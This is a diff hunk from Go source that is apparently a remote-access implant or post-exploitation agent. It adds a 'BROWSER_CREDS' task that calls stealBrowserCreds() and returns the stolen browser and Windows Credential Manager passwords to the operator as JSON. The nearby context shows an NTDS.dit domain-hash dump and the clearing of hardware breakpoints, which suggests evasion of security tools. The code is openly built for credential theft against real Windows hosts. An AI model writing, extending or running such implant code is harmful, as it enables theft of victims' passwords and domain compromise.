@@ -1084,6 +1084,17 @@ func dispatchTask(t transport, task taskWire) {
 		clearHardwareBreakpoints()
 		t.sendResult(task.ID, "[+] hardware breakpoints cleared", "")
 
+	// ── Browser credentials + Windows Credential Manager ────────────────────
+
+	case "BROWSER_CREDS":
+		creds, err := stealBrowserCreds()
+		if err != nil {
+			t.sendResult(task.ID, "", err.Error())
+			return
+		}
+		data, _ := json.MarshalIndent(creds, "", "  ")
+		t.sendResult(task.ID, string(data), "")
+
 	// ── ntds.dit dump via ntdsutil ────────────────────────────────────────────
 
 	case "NTDS_DUMP":
